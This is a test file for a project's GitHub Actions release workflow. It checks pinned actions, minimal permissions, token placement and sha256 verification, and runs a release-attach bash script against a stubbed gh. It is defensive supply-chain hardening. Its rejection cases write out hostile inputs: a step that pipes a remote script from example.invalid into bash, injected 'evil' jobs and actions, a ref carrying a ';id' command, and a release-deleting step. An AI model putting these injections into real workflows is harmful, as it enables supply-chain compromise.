import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { chmodSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";

import { afterAll, describe, expect, it } from "vitest";
import { parse } from "yaml";

// U10-b (DAN-742), invariant 5: publish.yml as GitHub reads it, parsed YAML
// (escapes, quoted keys, flow mappings and aliases resolved), checked against
// exact allow lists. Comments are only read for the version of each pin.
const ROOT = resolve(import.meta.dirname, "../..");
const PUBLISH = readFileSync(resolve(ROOT, ".github/workflows/publish.yml"), "utf8");
const CI = readFileSync(resolve(ROOT, ".github/workflows/ci.yml"), "utf8");
const NODE = readFileSync(resolve(ROOT, ".nvmrc"), "utf8").trim();

const pin = (action: string, sha: string) => `actions/${action}@${sha}`;
const CHECKOUT = pin("checkout", "3d3c42e5aac5ba805825da76410c181273ba90b1");
const SETUP_NODE = pin("setup-node", "949feb2413d6458794dcd2491c4babbbce0c15c1");
const UPLOAD = pin("upload-artifact", "cf430e030ddbb5b0abf93d22962f4752f3646cd9");
const DOWNLOAD = pin("download-artifact", "9000827ccba6bdab643e8b6fd33ac0654aef8333");
const PNPM = "pnpm/action-setup@ea17c68df8912ef543352723c149a84f56e3d413";

const TAGS = ["contracts-v*.*.*", "test-fakes-v*.*.*"];
const FILE = "${{ needs.verify.outputs.file }}";
const TOKEN = "${{ secrets.GITHUB_TOKEN }}";
const TOKEN_AT = "jobs.publish.steps.3.env.NODE_AUTH_TOKEN";
// DAN-966: the release job's gh token, the only other place a token may be.
const GH_TOKEN_AT = "jobs.release.steps.2.env.GH_TOKEN";
const SHA = "${{ needs.verify.outputs.sha256 }}";
// Every expression the workflow may hold: where, and exactly what.
const EXPRESSIONS: Readonly<Record<string, string>> = {
  "concurrency.group": "publish-${{ github.ref }}",
  "jobs.verify.outputs.file": "${{ steps.tarball.outputs.file }}",
  "jobs.verify.outputs.sha256": "${{ steps.tarball.outputs.sha256 }}",
  "jobs.verify.steps.9.env.PACKAGE": "${{ steps.tag.outputs.package }}",
  "jobs.verify.steps.9.env.RELEASE_VERSION": "${{ steps.tag.outputs.version }}",
  "jobs.verify.steps.10.with.path": "dist/release/tarball/${{ steps.tarball.outputs.file }}",
  "jobs.publish.steps.2.env.FILE": FILE,
  "jobs.publish.steps.2.env.SHA256": "${{ needs.verify.outputs.sha256 }}",
  "jobs.publish.steps.3.env.FILE": FILE,
  [TOKEN_AT]: TOKEN,
  "jobs.release.steps.1.env.FILE": FILE,
  "jobs.release.steps.1.env.SHA256": SHA,
  "jobs.release.steps.2.env.FILE": FILE,
  "jobs.release.steps.2.env.SHA256": SHA,
  [GH_TOKEN_AT]: TOKEN,
};
const VERIFY_RUNS = [
  "pnpm install --frozen-lockfile",
  "pnpm release:tag",
  "pnpm typecheck",
  "pnpm test:unit",
  "pnpm test:integration",
  "pnpm release:check",
  'pnpm release:tarball "$PACKAGE"',
];
const SHA_STEP = {
  name: "Provjera sha256",
  env: Object.fromEntries([
    ["FILE", FILE],
    ["SHA256", SHA],
  ]),
  // DAN-866 (review on #148): a run without `shell:` is `bash -e {0}`, no pipefail.
  run: [
    "set -o pipefail",
    '[[ "$FILE" =~ ^ductura-(contracts|test-fakes)-[0-9]+\\.[0-9]+\\.[0-9]+\\.tgz$ ]]',
    '[[ "$SHA256" =~ ^[0-9a-f]{64}$ ]]',
    '[ "$(find release -type f | wc -l)" -eq 1 ]',
    'printf \'%s  %s\\n\' "$SHA256" "release/$FILE" | sha256sum --check --strict -',
    "",
  ].join("\n"),
};
// 5f: the job that may write packages, in full. No checkout, no pnpm, no
// repository code; the sha256 of verify's file, then npm publish of that file.
const PUBLISH_JOB = {
  name: "Objava na GitHub Packages",
  needs: "verify",
  "runs-on": "ubuntu-latest",
  "timeout-minutes": 10,
  environment: "packages",
  permissions: { contents: "read", packages: "write" },
  steps: [
    {
      uses: SETUP_NODE,
      with: {
        "node-version": NODE,
        "package-manager-cache": false,
        "registry-url": "https://npm.pkg.github.com",
        scope: "@ductura",
      },
    },
    { uses: DOWNLOAD, with: { name: "release-tarball", path: "release" } },
    SHA_STEP,
    {
      name: "Objava",
      env: Object.fromEntries([
        ["FILE", FILE],
        ["NODE_AUTH_TOKEN", TOKEN],
      ]),
      run: 'npm publish --ignore-scripts "./release/$FILE"',
    },
  ],
};

// DAN-966: the job that attaches verify's tarball to the public GitHub Release
// of the tag, in full. Only contents: write, no repository code; the tag comes
// from $GITHUB_REF (no expression) and must name the verified file.
const ATTACH = [
  "set -o pipefail",
  '[[ "$GITHUB_REF" =~ ^refs/tags/(contracts|test-fakes)-v([0-9]+\\.[0-9]+\\.[0-9]+)$ ]]',
  'PACKAGE="${BASH_REMATCH[1]}"',
  'VERSION="${BASH_REMATCH[2]}"',
  'TAG="${GITHUB_REF#refs/tags/}"',
  '[ "$FILE" = "ductura-$PACKAGE-$VERSION.tgz" ]',
  'export GH_REPO="$GITHUB_REPOSITORY"',
  // DAN-966-2a: a rerun finds its own asset. The same sha256 passes without an
  // upload; another one fails before any upload. A failed view goes to create,
  // which fails on an existing release, so it never leads to upload.
  'if names="$(gh release view "$TAG" --json assets --jq \'.assets[].name\')"; then',
  '  if grep -Fxq -- "$FILE" <<< "$names"; then',
  '    got="$(mktemp -d)/asset"',
  '    gh release download "$TAG" --pattern "$FILE" --output "$got"',
  '    printf \'%s  %s\\n\' "$SHA256" "$got" | sha256sum --check --strict -',
  '    echo "::notice::$FILE is already attached with the same sha256"',
  "    exit 0",
  "  fi",
  '  gh release upload "$TAG" "./release/$FILE"',
  "else",
  '  gh release create "$TAG" "./release/$FILE" --verify-tag --title "$TAG" --notes "sha256 $SHA256"',
  "fi",
  "",
].join("\n");
const RELEASE_JOB = {
  name: "Prilaganje izdanju",
  needs: "verify",
  "runs-on": "ubuntu-latest",
  "timeout-minutes": 10,
  environment: "packages",
  permissions: { contents: "write" },
  steps: [
    { uses: DOWNLOAD, with: { name: "release-tarball", path: "release" } },
    SHA_STEP,
    {
      name: "Prilaganje",
      env: Object.fromEntries([
        ["FILE", FILE],
        ["SHA256", SHA],
        ["GH_TOKEN", TOKEN],
      ]),
      run: ATTACH,
    },
  ],
};

type Node = Record<string, unknown>;
const keys = (value: unknown) => Object.keys((value ?? {}) as Node).join(",");
const same = (a: unknown, b: unknown) => JSON.stringify(a) === JSON.stringify(b);

/** [path, value] of every string in `value`, with dotted paths. */
function strings(value: unknown, path = ""): [string, string][] {
  if (typeof value === "string") return [[path, value]];
  if (typeof value !== "object" || value === null) return [];
  return Object.entries(value).flatMap(([key, child]) =>
    strings(child, path === "" ? key : `${path}.${key}`),
  );
}

const STEP_KEYS = ["name", "id", "uses", "with", "env", "run"];

/** Every rule of invariant 5 that the workflow text breaks. */
export function publishErrors(text: string): string[] {
  const errors: string[] = [];
  let doc: Node;
  try {
    doc = parse(text, { uniqueKeys: true, merge: false }) as Node;
  } catch (error) {
    return [`not YAML: ${String(error)}`];
  }
  const jobs = (doc.jobs ?? {}) as Record<string, Node>;
  const verify = jobs.verify ?? {};
  const steps = (verify.steps ?? []) as Node[];
  // 5a: only push of the two tag patterns, and (DAN-804) workflow_dispatch
  // without inputs, which release:tag refuses on any ref but the tag itself.
  if (keys(doc) !== "name,on,permissions,concurrency,jobs") errors.push(`top: ${keys(doc)}`);
  if (!same(doc.on, { push: { tags: TAGS }, ["workflow_dispatch"]: null }))
    errors.push("trigger is not the two tag patterns and a bare workflow_dispatch");
  // 5b: nothing at the top, read in verify, packages: write only in publish.
  if (!same(doc.permissions, {})) errors.push("top permissions are not {}");
  if (keys(jobs) !== "verify,publish,release") errors.push(`jobs: ${keys(jobs)}`);
  if (keys(verify) !== "name,runs-on,timeout-minutes,permissions,outputs,steps")
    errors.push(`verify keys: ${keys(verify)}`);
  if (!same(verify.permissions, { contents: "read" })) errors.push("verify may write");
  // 5c, 5e: every expression in its one place with its one value, so the
  // token is only in the npm publish step and no run holds an expression.
  for (const [path, value] of strings(doc)) {
    if (value.includes("${{") && EXPRESSIONS[path] !== value)
      errors.push(`expression at ${path}: ${value}`);
    if (/secrets\.|github\.token/u.test(value) && path !== TOKEN_AT && path !== GH_TOKEN_AT)
      errors.push(`token at ${path}`);
  }
  // 5d: every action pinned to a full SHA, with its version as a comment.
  for (const [, uses = ""] of text.matchAll(/^\s*(?:- )?uses: (.*)$/gmu))
    if (!/^[a-z0-9-]+\/[a-z0-9-]+@[0-9a-f]{40} # v\d+\.\d+\.\d+$/u.test(uses))
      errors.push(`not pinned: ${uses}`);
  // 5f: publish is exactly PUBLISH_JOB.
  if (!same(jobs.publish, PUBLISH_JOB)) errors.push("publish is not the expected job");
  // DAN-966: release is exactly RELEASE_JOB.
  if (!same(jobs.release, RELEASE_JOB)) errors.push("release is not the expected job");
  // DAN-742: npm reads a bare "dir/file.tgz" as the GitHub shorthand owner/repo
  // and tries git over ssh, so every tarball npm publish gets starts with "./".
  for (const [path, value] of strings(jobs.publish, "jobs.publish"))
    for (const [, spec = ""] of value.matchAll(/npm publish(?: --[a-z-]+)* "?([^"\s]+)/gu))
      if (!spec.startsWith("./"))
        errors.push(`npm publish of a non-local path at ${path}: ${spec}`);
  // 5g and verify: known actions with exact inputs, no cache, no credentials
  // kept, no condition, shell or env that changes a step; the checks in order.
  const inputs: Readonly<Record<string, unknown>> = {
    [CHECKOUT]: { "fetch-depth": 0, "persist-credentials": false },
    [PNPM]: undefined,
    [SETUP_NODE]: { "node-version-file": ".nvmrc", "package-manager-cache": false },
    [UPLOAD]: {
      name: "release-tarball",
      path: EXPRESSIONS["jobs.verify.steps.10.with.path"],
      "if-no-files-found": "error",
      "retention-days": 1,
    },
  };
  for (const [i, step] of steps.entries()) {
    const uses = step.uses === undefined ? undefined : String(step.uses);
    if (Object.keys(step).some((key) => !STEP_KEYS.includes(key)))
      errors.push(`verify step ${i}: ${keys(step)}`);
    if (uses !== undefined && (!(uses in inputs) || !same(step.with, inputs[uses])))
      errors.push(`verify step ${i}: ${uses}`);
    if (step.env !== undefined && i !== 9) errors.push(`verify step ${i}: env`);
  }
  const runs = steps.flatMap((step) => (step.run === undefined ? [] : [step.run]));
  if (!same(runs, VERIFY_RUNS)) errors.push(`verify runs: ${runs.join(" | ")}`);
  if (steps[0]?.uses !== CHECKOUT || steps.at(-1)?.uses !== UPLOAD)
    errors.push("verify does not start with checkout and end with the upload");
  return errors;
}

describe("publish.yml", () => {
  it("keeps every rule of invariant 5", () => {
    expect(publishErrors(PUBLISH)).toEqual([]);
  });

  const replace = (from: string, to: string) => {
    expect(PUBLISH, from).toContain(from);
    return PUBLISH.replace(from, to);
  };
  const tags = '    tags: ["contracts-v*.*.*", "test-fakes-v*.*.*"]\n';
  const publishStep = '        run: npm publish --ignore-scripts "./release/$FILE"\n';
  const sha = "      - name: Provjera sha256\n";
  const tagStep = "        run: pnpm release:tag\n";
  const rel =
    "  release:\n    name: Prilaganje izdanju\n    needs: verify\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    environment: packages\n";
  const attach = "      - name: Prilaganje\n";

  it.each([
    ["5a pull_request", tags, `${tags}  pull_request:\n`],
    ["5a pull_request_target", tags, `${tags}  pull_request_target:\n`],
    // DAN-804 replaces "5a workflow_dispatch": a dispatch is allowed, but no input.
    [
      "5a workflow_dispatch with inputs",
      "  workflow_dispatch:\n",
      "  workflow_dispatch:\n    inputs:\n      ref: { type: string }\n",
    ],
    [
      "5a workflow_dispatch with an empty map",
      "  workflow_dispatch:\n",
      "  workflow_dispatch: {}\n",
    ],
    ["5a without workflow_dispatch", "  workflow_dispatch:\n", ""],
    [
      "5a repository_dispatch",
      "  workflow_dispatch:\n",
      "  workflow_dispatch:\n  repository_dispatch:\n",
    ],
    [
      "5e RELEASE_VERSION from the ref name",
      "RELEASE_VERSION: ${{ steps.tag.outputs.version }}",
      "RELEASE_VERSION: ${{ github.ref_name }}",
    ],
    ["5a workflow_run", tags, `${tags}  workflow_run:\n    workflows: [CI]\n`],
    ["5a a trigger after a blank line", tags, `${tags}\n  issue_comment:\n    types: [created]\n`],
    ["5a push branches", tags, `${tags}    branches: [main]\n`],
    ["5a a third pattern", '"test-fakes-v*.*.*"]', '"test-fakes-v*.*.*", "*"]'],
    ["5a a top-level env", "permissions: {}\n", "env: { A: b }\npermissions: {}\n"],
    ["5b packages: write at the top", "permissions: {}\n", "permissions: { packages: write }\n"],
    ["5b write-all", "permissions: {}\n", "permissions: write-all\n"],
    [
      "5b packages: write in verify",
      "      contents: read\n    outputs:",
      "      contents: read\n      packages: write\n    outputs:",
    ],
    [
      "5b contents: write in publish",
      "      contents: read\n      packages: write",
      "      contents: write\n      packages: write",
    ],
    [
      "5b id-token in publish",
      "      packages: write\n",
      "      packages: write\n      id-token: write\n",
    ],
    [
      "5b a hidden job with escaped keys",
      publishStep,
      `${publishStep}  evil: # x\n    runs-on: ubuntu-latest\n    "perm\\x69ssions": { packages: "wr\\x69te" }\n    steps:\n      - run: echo\n`,
    ],
    [
      "5b an underscore job",
      publishStep,
      `${publishStep}  evil_job:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo\n`,
    ],
    [
      "5c token in verify",
      "          PACKAGE: ${{",
      `          T: ${TOKEN}\n          PACKAGE: \${{`,
    ],
    [
      "5c token in the job env",
      "    environment: packages\n",
      `    environment: packages\n    env:\n      NODE_AUTH_TOKEN: ${TOKEN}\n`,
    ],
    [
      "5c github.token",
      "          PACKAGE: ${{",
      "          T: ${{ github.token }}\n          PACKAGE: ${{",
    ],
    ["5c another secret", "secrets.GITHUB_TOKEN", "secrets.NPM_TOKEN"],
    ["5d a tag", `${CHECKOUT} # v7.0.1`, "actions/checkout@v7 # v7.0.1"],
    ["5d a short SHA", `${DOWNLOAD} # v8.0.2`, "actions/download-artifact@9000827 # v8.0.2"],
    ["5d no version comment", `${DOWNLOAD} # v8.0.2`, DOWNLOAD],
    [
      "5e ref_name in run",
      'pnpm release:tarball "$PACKAGE"',
      "pnpm release:tarball ${{ github.ref_name }}",
    ],
    [
      "5e ref_name through env",
      "PACKAGE: ${{ steps.tag.outputs.package }}",
      "PACKAGE: ${{ github.ref_name }}",
    ],
    [
      "5e event in run",
      "run: pnpm release:tag",
      "run: echo ${{ github.event.ref }} && pnpm release:tag",
    ],
    [
      "5e output in a run block",
      '"release/$FILE" | sha256sum',
      '"release/${{ needs.verify.outputs.file }}" | sha256sum',
    ],
    [
      "5f checkout in publish",
      sha,
      `      - uses: ${CHECKOUT} # v7.0.1\n        with:\n          persist-credentials: false\n${sha}`,
    ],
    ["5f pnpm install in publish", sha, `      - run: pnpm install --frozen-lockfile\n${sha}`],
    [
      "5f a downloaded script in publish",
      sha,
      `      - run: curl -fsSL https://example.invalid/x.sh | bash\n${sha}`,
    ],
    [
      "5f another action in publish",
      sha,
      `      - uses: evil-org/evil-action@${"a".repeat(40)} # v1.0.0\n${sha}`,
    ],
    ["5f continue-on-error on the sha256 check", sha, `${sha}        continue-on-error: true\n`],
    ["5f a shell without -e", sha, `${sha}        shell: bash {0}\n`],
    ["5f if: always() on publish", "    needs: verify\n", "    needs: verify\n    if: always()\n"],
    ["5f without --ignore-scripts", "npm publish --ignore-scripts", "npm publish"],
    // DAN-742: the first publish failed on this; npm took it for owner/repo.
    ["5f a tarball npm reads as a GitHub shorthand", '"./release/$FILE"', '"release/$FILE"'],
    ["5f without the sha256 check", "sha256sum --check --strict -", "cat"],
    ["5f a pipe without pipefail", "          set -o pipefail\n", ""],
    ["5f publish without verify", "    needs: verify\n", ""],
    ["5f publish without the environment", "    environment: packages\n", ""],
    ["5f another node", 'node-version: "24"', 'node-version: "22"'],
    [
      "5g a checkout with credentials",
      "          fetch-depth: 0\n          persist-credentials: false\n",
      "          fetch-depth: 0\n",
    ],
    [
      "5g a cache in verify",
      "          package-manager-cache: false\n      - run: pnpm",
      "          cache: pnpm\n      - run: pnpm",
    ],
    [
      "verify: continue-on-error on the tag check",
      tagStep,
      `${tagStep}        continue-on-error: true\n`,
    ],
    ["verify: an if on the tag check", tagStep, `${tagStep}        if: false\n`],
    ["verify: without the tag check", tagStep, "        run: echo\n"],
    [
      "verify: the tag check after the tests",
      `${tagStep}      - name: Provjera tipova\n        run: pnpm typecheck\n`,
      `        run: pnpm typecheck\n      - name: Provjera tipova\n${tagStep}`,
    ],
    ["a duplicate key", "permissions: {}\n", "permissions: {}\npermissions: {}\n"],
    // DAN-966: the release job.
    ["966 without the release job", "  release:\n", "  release_x:\n"],
    [
      "966 packages: write in release",
      "      contents: write\n",
      "      contents: write\n      packages: write\n",
    ],
    [
      "966 actions: read in release",
      "      contents: write\n",
      "      contents: write\n      actions: read\n",
    ],
    [
      "966 write-all in release",
      "    permissions:\n      contents: write\n",
      "    permissions: write-all\n",
    ],
    ["966 release after publish", rel, rel.replace("needs: verify", "needs: [verify, publish]")],
    ["966 release without the environment", rel, rel.replace("    environment: packages\n", "")],
    ["966 release without a timeout", rel, rel.replace("    timeout-minutes: 10\n", "")],
    ["966 if: failure() on release", rel, `${rel}    if: failure()\n`],
    ["966 continue-on-error on release", rel, `${rel}    continue-on-error: true\n`],
    ["966 a job env in release", rel, `${rel}    env: { A: b }\n`],
    ["966 self-hosted", rel, rel.replace("ubuntu-latest", "self-hosted")],
    ["966 checkout in release", attach, `      - uses: ${CHECKOUT} # v7.0.1\n${attach}`],
    [
      "966 pnpm install in release",
      attach,
      `      - run: pnpm install --frozen-lockfile\n${attach}`,
    ],
    [
      "966 attach without the sha256 check",
      "sha256sum --check --strict -\n      # The tag",
      "cat\n      # The tag",
    ],
    ["966 continue-on-error on the attach", attach, `${attach}        continue-on-error: true\n`],
    ["966 a shell on the attach", attach, `${attach}        shell: bash {0}\n`],
    [
      "966 --clobber",
      'upload "$TAG" "./release/$FILE"\n',
      'upload "$TAG" "./release/$FILE" --clobber\n',
    ],
    ["966 create without --verify-tag", " --verify-tag", ""],
    ["966 create on a target", " --verify-tag", " --target main"],
    ["966 a draft", " --verify-tag", " --verify-tag --draft"],
    ["966 every file", 'upload "$TAG" "./release/$FILE"', 'upload "$TAG" ./release/*'],
    ["966 an unanchored ref", "=~ ^refs/tags/(", "=~ refs/tags/("],
    ["966 GITHUB_REF_NAME", 'TAG="${GITHUB_REF#refs/tags/}"', 'TAG="$GITHUB_REF_NAME"'],
    [
      "966 the tag through an expression",
      'TAG="${GITHUB_REF#refs/tags/}"',
      'TAG="${{ github.ref_name }}"',
    ],
    ["966 GH_REPO through an expression", '"$GITHUB_REPOSITORY"', '"${{ github.repository }}"'],
    ["966 github.token", `GH_TOKEN: ${TOKEN}`, "GH_TOKEN: ${{ github.token }}"],
    [
      "966-2a no sha256 check of the attached asset",
      '      printf \'%s  %s\\n\' "$SHA256" "$got" | sha256sum --check --strict -\n',
      "",
    ],
    ["966-2a a download that may fail", '--output "$got"\n', '--output "$got" || true\n'],
    ["966-2a exit 0 before the check", '    got="$(mktemp', '    exit 0\n    got="$(mktemp'],
    ["966-2a a partial name match", "grep -Fxq --", "grep -Fq --"],
    [
      "966-2a an upload after the check",
      "    exit 0\n",
      '    gh release upload "$TAG" "./release/$FILE" --clobber\n    exit 0\n',
    ],
    [
      "966 a deleted release",
      "      - name: Prilaganje\n",
      "      - run: gh release delete x\n      - name: Prilaganje\n",
    ],
  ])("refuses %s", (_, from, to) => {
    expect(publishErrors(replace(from, to))).not.toEqual([]);
  });

  it.each(['"release/$FILE"', "release/$FILE", '"$FILE"'])(
    "names npm publish of %s as a non-local path (DAN-742)",
    (spec) => {
      expect(publishErrors(replace('"./release/$FILE"', spec))).toContain(
        `npm publish of a non-local path at jobs.publish.steps.3.run: ${spec.replaceAll('"', "")}`,
      );
    },
  );
});

// DAN-966: the attach step run by real bash -e, with a stub gh that logs its calls.
// DAN-966-2a: view prints ASSETS; download writes REMOTE to its --output.
describe("publish.yml attach step", () => {
  const dir = mkdtempSync(join(tmpdir(), "dan-966-"));
  afterAll(() => rmSync(dir, { recursive: true, force: true }));
  const script = join(dir, "attach.sh");
  writeFileSync(script, ATTACH);
  const gh = join(dir, "gh");
  writeFileSync(
    gh,
    [
      "#!/bin/sh",
      'echo "$GH_REPO $*" >> "$GH_LOG"',
      'case "$2" in',
      '  view) [ -n "$EXISTS" ] && printf "%s" "$ASSETS" ;;',
      '  download) [ -z "$DL_FAIL" ] || exit 1; [ -n "$DL_NONE" ] || printf "%s" "$REMOTE" > "$7" ;;',
      '  create) [ -z "$CREATE_FAIL" ] ;;',
      "esac",
      "",
    ].join("\n"),
  );
  chmodSync(gh, 0o755);
  const bytes = "verified tarball bytes";
  const sum = createHash("sha256").update(bytes).digest("hex");
  type Remote = {
    exists?: boolean;
    assets?: string;
    remote?: string;
    dlFail?: boolean;
    dlNone?: boolean;
    createFail?: boolean;
  };
  let raw: string[] = [];
  const run = (ref: string, file: string, remote: Remote = {}) => {
    const log = join(dir, `log-${Math.random()}`);
    writeFileSync(log, "");
    const env = Object.fromEntries([
      ["PATH", `${dir}:${process.env.PATH ?? ""}`],
      ["TMPDIR", dir],
      ["GITHUB_REF", ref],
      ["GITHUB_REPOSITORY", "ductura/Institution_server"],
      ["FILE", file],
      ["SHA256", sum],
      ["GH_LOG", log],
      ["EXISTS", remote.exists === true ? "1" : ""],
      ["ASSETS", remote.assets ?? ""],
      ["REMOTE", remote.remote ?? bytes],
      ["DL_FAIL", remote.dlFail === true ? "1" : ""],
      ["DL_NONE", remote.dlNone === true ? "1" : ""],
      ["CREATE_FAIL", remote.createFail === true ? "1" : ""],
    ]);
    const { status } = spawnSync("bash", ["-e", script], { env });
    const calls = readFileSync(log, "utf8").split("\n").filter(Boolean);
    raw = calls;
    return { status, calls: calls.map((call) => call.replace(/--output \S+/u, "--output <tmp>")) };
  };
  const C = "ductura-contracts-2.1.0.tgz";
  const VIEW =
    "ductura/Institution_server release view contracts-v2.1.0 --json assets --jq .assets[].name";
  const DOWNLOAD_C = `ductura/Institution_server release download contracts-v2.1.0 --pattern ${C} --output <tmp>`;

  // Negative cases first: the same name with other bytes never passes or uploads.
  it.each([
    ["other bytes", { remote: "other bytes" }],
    ["an empty asset", { remote: "" }],
    ["a failed download", { dlFail: true }],
    ["a download that writes nothing", { dlNone: true }],
  ])("fails on %s under the same name, before any upload", (_, remote) => {
    expect(run("refs/tags/contracts-v2.1.0", C, { exists: true, assets: C, ...remote })).toEqual({
      status: 1,
      calls: [VIEW, DOWNLOAD_C],
    });
  });

  it("never uploads after a failed view: create fails on the existing release", () => {
    const result = run("refs/tags/contracts-v2.1.0", C, { createFail: true });
    expect(result.status).not.toBe(0);
    expect(result.calls.filter((call) => call.includes(" upload "))).toEqual([]);
  });

  it("passes a rerun with the same sha256, without an upload", () => {
    const assets = `notes.txt\n${C}\n`;
    expect(run("refs/tags/contracts-v2.1.0", C, { exists: true, assets })).toEqual({
      status: 0,
      calls: [VIEW, DOWNLOAD_C],
    });
  });

  it("downloads into a fresh folder, never into ./release", () => {
    expect(run("refs/tags/contracts-v2.1.0", C, { exists: true, assets: C }).status).toBe(0);
    const output = /--output (\S+)$/u.exec(raw[1] ?? "")?.[1] ?? "";
    expect(output).toMatch(new RegExp(`^${dir}/tmp\\.[A-Za-z0-9]+/asset$`, "u"));
    expect(readFileSync(output, "utf8")).toBe(bytes);
  });

  it("creates the release with the verified file on the existing tag", () => {
    expect(run("refs/tags/contracts-v2.1.0", C)).toEqual({
      status: 0,
      calls: [
        VIEW,
        `ductura/Institution_server release create contracts-v2.1.0 ./release/${C} --verify-tag --title contracts-v2.1.0 --notes sha256 ${sum}`,
      ],
    });
  });

  it("uploads to an existing release without --clobber", () => {
    const file = "ductura-test-fakes-2.0.0.tgz";
    expect(run("refs/tags/test-fakes-v2.0.0", file, { exists: true })).toEqual({
      status: 0,
      calls: [
        "ductura/Institution_server release view test-fakes-v2.0.0 --json assets --jq .assets[].name",
        `ductura/Institution_server release upload test-fakes-v2.0.0 ./release/${file}`,
      ],
    });
  });

  it.each([
    ["a longer name", `${C}.bak`],
    ["a prefix", `x-${C}`],
    ["a CR", `${C}\r`],
    ["a tab", `${C}\t`],
    ["an NBSP", `${C} `],
    ["a DEL", `${C}\u007f`],
    ["a Windows path", `release\\${C}`],
  ])("reads an asset with %s as another asset: one upload, no download", (_, name) => {
    expect(run("refs/tags/contracts-v2.1.0", C, { exists: true, assets: name })).toEqual({
      status: 0,
      calls: [VIEW, `ductura/Institution_server release upload contracts-v2.1.0 ./release/${C}`],
    });
  });

  it.each([
    ["a branch", "refs/heads/main", C],
    ["another package's file", "refs/tags/contracts-v2.1.0", "ductura-test-fakes-2.1.0.tgz"],
    ["another version's file", "refs/tags/contracts-v2.1.0", "ductura-contracts-2.1.1.tgz"],
    ["a suffix", "refs/tags/contracts-v2.1.0-x", C],
    ["a prefix", "xrefs/tags/contracts-v2.1.0", C],
    ["a newline", "refs/tags/contracts-v2.1.0\n", C],
    ["a CR", "refs/tags/contracts-v2.1.0\r", C],
    ["a tab", "refs/tags/contracts-v2.1.0\t", C],
    ["an NBSP", "refs/tags/contracts-v2.1.0 ", C],
    ["a DEL", "refs/tags/contracts-v2.1.0\u007f", C],
    ["a command", "refs/tags/contracts-v2.1.0;id", C],
    ["a Windows path", "refs\\tags\\contracts-v2.1.0", C],
    ["an empty ref", "", C],
  ])("refuses %s before any gh call", (_, ref, file) => {
    const result = run(ref, file, { exists: true, assets: C });
    expect(result.status).not.toBe(0);
    expect(result.calls).toEqual([]);
  });
});

describe("ci.yml", () => {
  it("runs the publish path without the upload and without a token on every PR", () => {
    const doc = parse(CI) as { jobs: { checks: { steps: Node[] } } };
    const step = doc.jobs.checks.steps.find((s) => s.name === "Probna objava");
    expect(step?.run).toBe(
      [
        "pnpm release:check",
        "pnpm release:tarball contracts test-fakes",
        'for file in dist/release/tarball/*.tgz; do npm publish --dry-run --ignore-scripts "$file"; done',
        "",
      ].join("\n"),
    );
    // ZEL-CI-SRV: once per run, on the leg provjere of checks.
    expect(keys(step)).toBe("name,if,run");
    expect(step?.if).toBe("matrix.leg == 'provjere'");
    const tokens = strings(doc).filter(([, value]) =>
      /secrets\.|github\.token|NODE_AUTH/u.test(value),
    );
    expect(tokens).toEqual([]);
  });
});
